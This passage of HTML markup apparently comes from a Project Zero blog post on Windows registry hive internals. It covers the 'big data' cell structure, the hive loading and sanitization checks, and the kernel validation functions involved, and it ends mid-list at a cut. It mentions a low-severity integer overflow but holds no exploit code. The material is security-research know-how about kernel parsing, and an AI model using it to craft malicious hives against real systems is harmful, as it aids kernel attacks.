 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;MvcjwGOuIU-c28&quot;&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c85&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Registry element&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c74&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Size limit&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c61&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Value&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c74&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_3m5uvca0lm53-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c20&quot;&gt;Available memory (latest format) &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c17 MvcjwGOuIU-c80&quot;&gt;[editor&amp;#39;s note: this is not fully accurate]&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c20&quot;&gt;1 MB (standard format)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Here, &amp;quot;standard format&amp;quot; refers to regf v1.3. On some level, 1 MB could be considered a reasonable limit, as the registry was not designed to serve as storage for large quantities of data &amp;ndash; at least not initially. One example of a public resource which vocalized this design decision was the old &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users&quot;&gt;Windows registry information for advanced users&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;article from around 2002-2003, which stated:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;MvcjwGOuIU-c28&quot;&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c35&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c13 MvcjwGOuIU-c10&quot;&gt;Long values (more than 2,048 bytes) must be stored as files with the file names stored in the registry.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Nevertheless, it seems that at some point during the development of Windows XP, Microsoft decided to provide the registry clients with the ability to store larger chunks of data, not bound by the somewhat arbitrary limits of the regf format. In order to facilitate this use case, a new cell type was added, called the &amp;quot;big data&amp;quot;. Conceptually, it is simply a means of dividing one long data blob into smaller portions of 16344 bytes, each stored in a separate cell. It replaces the single backing cell with a _CM_BIG_DATA structure defined as follows:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_CM_BIG_DATA&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;nt!_CM_BIG_DATA&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Signature&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x002&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Count&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x004&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;br/&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;The signature is set to 0x6264 (&amp;#39;db&amp;#39;) and verified on hive load, but otherwise not used. The count represents the number of 16344-byte chunks making up the overall value, and is generally supposed to be set to an integer between 2&amp;ndash;65535. Otherwise, if it was set to 0, that would mean that the value is empty so the big data object shouldn&amp;#39;t be present at all. If it was equal to 1, a direct backing buffer should have been used instead, so such a construct would also be invalid. Neither zero nor one are thus accepted by the hive loader, but it is technically possible to set these values at runtime by abusing the aforementioned &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/16_Registry_value_big_data_count_overflow&quot;&gt;integer overflow bug&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;. We haven&amp;#39;t found any security impact of this behavior other than it being a correctness error, though.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The last element of the structure, List, is a cell index to a basic array of cell indexes making up the value chunks. Its format is equivalent to that of the value list, which also stores just the HCELL_INDEX values without any headers or additional information. Furthermore, every chunk other than the last one must contain exactly 16344 bytes. If the length of the overall value is not divisible by 16344, the final chunk contains the remaining 1&amp;ndash;16343 bytes. The layout of the big data object and its associated cells is shown in the diagram below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg6SwYri6hkJBoHs5op8qe6mhTYZeVJwH3JnfR3CexiLYMaOE4RbS6EXJNNzysF4f1gs3trpBnid1DTs2UqKIKGj08qppMdJ-eJ7duiFbeC1ASIBYP1PuMi3-XHPCJACC5i093_R141BIAnnXlhGusKX3IXYHgUFIyTuDggoE8oUTFxtFIcuRHde-aaFvM/s1999/image7.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg6SwYri6hkJBoHs5op8qe6mhTYZeVJwH3JnfR3CexiLYMaOE4RbS6EXJNNzysF4f1gs3trpBnid1DTs2UqKIKGj08qppMdJ-eJ7duiFbeC1ASIBYP1PuMi3-XHPCJACC5i093_R141BIAnnXlhGusKX3IXYHgUFIyTuDggoE8oUTFxtFIcuRHde-aaFvM/s1200/image7.png&quot; border=&quot;0&quot; alt=&quot;The layout of the big data object and its associated cells&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;The layout of the big data object and its associated cells&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;This concludes the part about the internal format of registry hives.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;MvcjwGOuIU-c70 MvcjwGOuIU-c12&quot; id=&quot;h.88panob3c0bs&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c40&quot;&gt;The hive loading and sanitization process&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;The hive loading process implemented by the NtLoadKey* &lt;/span&gt;&lt;span&gt;family&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;of system calls is a long and complex operation. It involves opening the hive file, loading it in memory, verifying its integrity, optionally recovering state from transactional log files, allocating any related kernel objects, attaching the hive to the global registry tree, and optionally opening a handle to the hive root and returning it to the caller. In this blog post, we are particularly interested in the hive sanitization part. Understanding this portion of the registry code is like consulting the official specification &amp;ndash; or even better, as the code doesn&amp;#39;t lie and is essentially the ground truth of what is and isn&amp;#39;t accepted as valid data. Furthermore, it provides us with a number of hints as to which properties of the format are imperative to the correct functioning of the database, and which ones are more conventional, and don&amp;#39;t have any serious consequences even if broken. The goal of this section is to discuss the overall control flow of loading a hive and performing the initial pass of sanitization. By documenting which internal routines are responsible for which checks, we hope to make it easier for other security researchers to navigate the hive loading code, providing a good starting point for their own investigations.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The registry, as a logical structure, is built on top of several lower-layer abstractions, each of which has a number of invariants that must hold in order for the hive to be considered valid, and in order for operations being performed on the hive to be safe. This is illustrated in the pyramid below, with the most foundational requirements placed at the bottom, and the increasingly more general aspects of hive integrity towards the top:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibUVk499wc-Yte1DVLfmcUQYhsQvy6ARBfLsri3Jiov3hZkY5WLsOqMoqkhMcBZkYJsLuKCaDm8eiamtml4qFL3FbrngHqpXVPwFhPXpwaDI5qYh9EHHIdJ0qc2XfCD6IFgOxIeHgsyKMWSuslXaajrOKuJ-GEnc-rzgQb0ohZKfOTAXHjfthXSEHlrCE/s5663/loading_pyramid.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibUVk499wc-Yte1DVLfmcUQYhsQvy6ARBfLsri3Jiov3hZkY5WLsOqMoqkhMcBZkYJsLuKCaDm8eiamtml4qFL3FbrngHqpXVPwFhPXpwaDI5qYh9EHHIdJ0qc2XfCD6IFgOxIeHgsyKMWSuslXaajrOKuJ-GEnc-rzgQb0ohZKfOTAXHjfthXSEHlrCE/s5663/loading_pyramid.png&quot; border=&quot;0&quot; alt=&quot;Diagram in the shape of a pyramid, with five levels. The base level showing the hive header, bin and cell layout consistency, and the top level showing Correctness of global hive properties, with all levels described below this image with examples &quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram in the shape of a pyramid, with five levels. The base level showing the hive header, bin and cell layout consistency, and the top level showing Correctness of global hive properties, with all levels described below this image with examples &quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Let&amp;#39;s consider some examples of validity checks at each level, starting with the most fundamental ones:&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ol class=&quot;lst-kix_82pihj16nguk-0 start&quot; start=&quot;1&quot;&gt;
  &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;
    &lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Hive header, bin and cell layout consistency&lt;/span&gt;
    &lt;ul class=&quot;lst-kix_82pihj16nguk-1 start&quot;&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Validity of the hive version, length, root cell index, flags in the header.&lt;/span&gt;
      &lt;/li&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Existence of at least one bin in the hive.&lt;/span&gt;
      &lt;/li&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Validity of each bin&amp;#39;s header, particularly the file offset and size.&lt;/span&gt;
      &lt;/li&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Validity of cells: aligned to eight bytes, within the bounds of the bin, completely filling out the bin.&lt;/span&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;
    &lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Intra-cell consistency&lt;/span&gt;
    &lt;ul class=&quot;lst-kix_82pihj16nguk-1 start&quot;&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Sufficient size of each cell with regards to the data it stores: at least the minimum size for the cell type (e.g. 0x4e for the key node), plus adequate to any variable-length internal arrays, such as the key name or value name.&lt;/span&gt;
      &lt;/li&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Correct signatures being set for every kind of cell depending on its function.&lt;/span&gt;
      &lt;/li&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Valid combinations of flags being set in key nodes and values.&lt;/span&gt;
      &lt;/li&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Strings (key names, value names) adhering to the format requirements regarding minimum and maximum lengths, charset, etc.&lt;/span&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;
    &lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Inter-cell consistency&lt;/span&gt;
    &lt;ul class=&quot;lst-kix_82pihj16nguk-1 start&quot;&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Valid references to cells in cell indexes, and each allocated cell only being used for one specific purpose.&lt;/span&gt;
      &lt;/li&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Consistency between copies of redundant data in separate cells: e.g. _CM_KEY_NODE.SubKeyCounts[...] vs. the length of the subkey index.&lt;/span&gt;
      &lt;/li&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Consistency between length markers in one cell vs. the amount of data stored in the corresponding backing buffer (e.g. _CM_KEY_VALUE.DataLength vs. length of the data stored in the raw data cell / big data cell).&lt;/span&gt;
      &lt;/li&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Correct hints in subkey indexes (fast leaves, hash leaves).&lt;/span&gt;
      &lt;/li&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Correct reference counts in the security descriptors.&lt;/span&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;
    &lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Structural correctness of high-level constructs&lt;/span&gt;
    &lt;ul class=&quot;lst-kix_82pihj16nguk-1 start&quot;&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Consistency of the linked list of security descriptors.&lt;/span&gt;
      &lt;/li&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Subkeys being laid out in a lexicographical order in all subkey indexes.&lt;/span&gt;
      &lt;/li&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Symbolic link keys having a single value named &amp;quot;SymbolicLinkValue&amp;quot; of type REG_LINK.&lt;/span&gt;
      &lt;/li&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span&gt;Subkeys in the stable space always having a non-volatile parent.&lt;/span&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;
    &lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Correctness of global hive properties&lt;/span&gt;
    &lt;ul class=&quot;lst-kix_82pihj16nguk-1 start&quot;&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span&gt;Each hive always containing at least one key (the root key) and at least one security descriptor.&lt;/span&gt;
      &lt;/li&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c12 c26 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Only the root of the hive, and no other key having the KEY_HIVE_ENTRY flag set.&lt;/span&gt;
      &lt;/li&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span&gt;The depth of the hive&amp;#39;s tree structure being a maximum of 512 levels.&lt;/span&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;As we can see, there are a variety of constraints that require verification when loading a hive, with the more abstract ones relying on the lower-layer ones to be confirmed first. It explains why the process is by far the most complex operation one can perform on the registry, spanning across thousands of lines of code and dozens of functions. To better illustrate this process, I&amp;#39;ve outlined the most important hive validation functions below, indented to show their hierarchical relationships as they execute in the kernel:&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_pvxkc5ur63o3-0 start&quot;&gt;
  &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;
    &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;NtLoadKey* &amp;rarr; CmLoadDifferencingKey &amp;rarr; CmLoad(App)Key&lt;/span&gt;
    &lt;ul class=&quot;lst-kix_pvxkc5ur63o3-1 start&quot;&gt;
      &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;
        &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpCmdHiveOpen &amp;rarr; CmpInitHiveFromFile &amp;rarr; CmpCreateHive&lt;/span&gt;
        &lt;ul class=&quot;lst-kix_pvxkc5ur63o3-2 start&quot;&gt;
          &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c12 c38 li-bullet-0&quot;&gt;
            &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;HvHiveStartFileBacked &amp;rarr; HvLoadHive&lt;/span&gt;
            &lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_pvxkc5ur63o3-3 start&quot;&gt;
              &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c50 c12 li-bullet-0&quot;&gt;
                &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;HvpGetHiveHeader&lt;/span&gt;
              &lt;/li&gt;
              &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c50 c12 li-bullet-0&quot;&gt;
                &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;HvAnalyzeLogFiles&lt;/span&gt;
              &lt;/li&gt;
              &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c12 c50 li-bullet-0&quot;&gt;
                &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;HvpPerformLogFileRecovery&lt;/span&gt;
              &lt;/li&gt;
              &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c50 c12 li-bullet-0&quot;&gt;
                &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;HvpRemapAndEnlistHiveBins&lt;/span&gt;
                &lt;ul class=&quot;lst-kix_pvxkc5ur63o3-4 start&quot;&gt;
                  &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c29 c12 li-bullet-0&quot;&gt;
                    &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;HvpValidateLoadedBin&lt;/span&gt;
                  &lt;/li&gt;
                  &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c29 c12 li-bullet-0&quot;&gt;
                    &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;HvpEnlistFreeCells&lt;/span&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c38 c12 li-bullet-0&quot;&gt;
            &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmCheckRegistry&lt;/span&gt;
            &lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_2w36zq8cd80k-3 start&quot;&gt;
              &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c50 c12 li-bullet-0&quot;&gt;
                &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;HvCheckHive&lt;/span&gt;
                &lt;ul class=&quot;lst-kix_2w36zq8cd80k-4 start&quot;&gt;
                  &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c29 c12 li-bullet-0&quot;&gt;
                    &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;HvCheckBin&lt;/span&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c50 c12 li-bullet-0&quot;&gt;
                &lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;CmpValidateHiveSecurityDescriptors&lt;/span&gt;
